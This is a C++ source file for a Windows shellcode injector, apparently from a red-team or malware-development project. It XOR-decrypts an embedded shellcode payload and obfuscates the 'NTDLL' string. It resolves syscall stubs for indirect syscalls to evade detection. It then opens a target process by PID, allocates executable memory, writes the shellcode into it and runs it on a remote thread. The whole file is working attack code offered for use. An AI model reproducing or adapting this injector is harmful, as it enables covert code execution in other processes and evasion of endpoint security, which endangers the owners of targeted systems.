#include <windows.h>
#include <stdio.h>
#include "wonka.h"

//bring in and define external variables
extern "C" {
    DWORD CSSN;
    DWORD OPSSN;
    DWORD CTSSN;
    DWORD WVMSSN;
    DWORD WFSOSSN;
    DWORD AVMSSN;

    UINT_PTR NtCreateTimerSyscall;
    UINT_PTR NtOpenTimerSyscall;
    UINT_PTR NtSetTimerSyscall;
    UINT_PTR NtQueryTimerSyscall;
    UINT_PTR NtCancelTimerSyscall;
}

//define XOR encrypted shellcode
unsigned char shellcode[] = 
    "\xa6\x29\xf0\x80\x87\x8d\xb3\x32\x5a\x61\x32\x35\x36\x35\x21\x63"
    "\xc\x29\x42\xb6\x12\x2d\xf8\x60\x3a\x29\xf8\x36\x6f\x2d\xf8\x60"
    "\x7a\x29\xf8\x16\x27\x2d\x7c\x85\x10\x2b\x3e\x55\xbe\x2d\x42\xf2"
    "\xf6\x5d\x12\x18\x75\x49\x53\x73\x9b\xa8\x7e\x25\x76\xa4\x91\xdf"
    "\x8\x20\x22\x2c\xfc\x37\x53\xb9\x18\x5d\x3b\x65\xa7\xee\xf3\xba"
    "\x5a\x61\x73\x2c\xf2\xa5\x7\x55\x12\x60\xa3\x34\xfc\x2d\x6b\x76"
    "\xd1\x21\x53\x2d\x76\xb5\x90\x64\x12\x9e\xba\x25\xfc\x51\xfb\x7a"
    "\x5b\xb7\x3e\x55\xbe\x2d\x42\xf2\xf6\x20\xb2\xad\x7a\x24\x72\xf3"
    "\x62\x81\x6\x95\x3b\x66\x3f\x16\x52\x24\x4a\xb5\x2\xbd\x2b\x76"
    "\xd1\x21\x57\x2d\x76\xb5\x15\x73\xd1\x6d\x3b\x20\xfc\x25\x6f\x7b"
    "\x5b\xb1\x32\xef\x73\xed\x3b\x33\x8a\x20\x2b\x25\x2f\x3b\x2a\x68"
    "\x1b\x39\x32\x3d\x36\x3f\x3b\xb1\xb6\x41\x32\x36\x88\x85\x2b\x73"
    "\x3\x3b\x3b\xef\x65\x8c\x24\xcd\xa5\x9e\x2e\x2c\xcd\x64\x73\x32"
    "\x5a\x61\x73\x64\x77\x2d\xfe\xbf\x5b\x60\x73\x64\x36\xdf\x42\xb9"
    "\x35\xe6\x8c\xb1\xcc\x85\x6e\x18\x50\x20\xc9\xc2\xe2\xd8\xee\xcd"
    "\x8f\x29\xf0\xa0\x5f\x59\x75\x4e\x50\xe1\x88\x84\x2\x60\xc8\x75"
    "\x49\x13\x1c\xe\x77\x3c\x32\xbb\x80\x9e\xa6\xa\x18\x11\x16\x42"
    "\x3b\x5\x5d\x1\xf\x0\x73";

//define XOR encrypted string NTDLL
char NDLCRY[] = "\x14\x35\x37\x28\x3b";

int main(int argc, char* argv[]) {

    //decrypt shellcode
    char key[] = "Zasdwes2";
    int ciphertext_length = sizeof(shellcode);
    xor_decrypt(shellcode, ciphertext_length, key);

    //define necessary variables for use
    SIZE_T rS = sizeof(shellcode);
    LARGE_INTEGER timeout;
    timeout.QuadPart = -1100;
    HANDLE pH = NULL;
    HANDLE nT = NULL;
    DWORD PID = NULL;
    PVOID bA = NULL;
    HMODULE hNTDLL;
    NTSTATUS STATUS = NULL;

    //check if PID was passed as argument, if not exit
    if (argc < 2) {
        printf("run with %s: <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
    CLIENT_ID CID = { (HANDLE)(uintptr_t)PID, NULL };

    //decrypt ntdll string and convert to LPCWSTR
    DecryptXOR(NDLCRY, strlen(NDLCRY), key, strlen(key));
    LPCWSTR NDLNOCRY = ConvertToLPCWSTR(NDLCRY);

    //get handle to ntdll
    hNTDLL = GetModuleHandleW(NDLNOCRY);

    //get stub location of timer related syscalls
    IndirectPrelude(hNTDLL, "NtCreateTimer", &NtCreateTimerSyscall);
    IndirectPrelude(hNTDLL, "NtOpenTimer", &NtOpenTimerSyscall);
    IndirectPrelude(hNTDLL, "NtSetTimer", &NtSetTimerSyscall);
    IndirectPrelude(hNTDLL, "NtQueryTimer", &NtQueryTimerSyscall);
    IndirectPrelude(hNTDLL, "NtCancelTimer", &NtCancelTimerSyscall);

    //open process with the passed PID
    STATUS = OP(&pH, PROCESS_ALL_ACCESS, &OA, &CID);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //allocate memory inside of the process
    STATUS = AVM(pH, &bA, 0, &rS, MEM_COMMIT | MEM_RESERVE, 0x40);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //write the shellcode to the allocated region
    STATUS = WVM(pH, bA, shellcode, sizeof(shellcode), NULL);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //create and execute thread with the previously written shellcode
    STATUS = CT(&nT, THREAD_ALL_ACCESS, NULL, pH, bA, NULL, FALSE, 0, 0, 0, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //wait for thread to be fully executed conclude
    STATUS = WFSO(nT, FALSE, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        return EXIT_FAILURE;
    }

    //cleanup by closing thread and closing process handle
    if (nT) {
        C(nT);
    }
    if (pH) {
        C(pH);
    }
 }
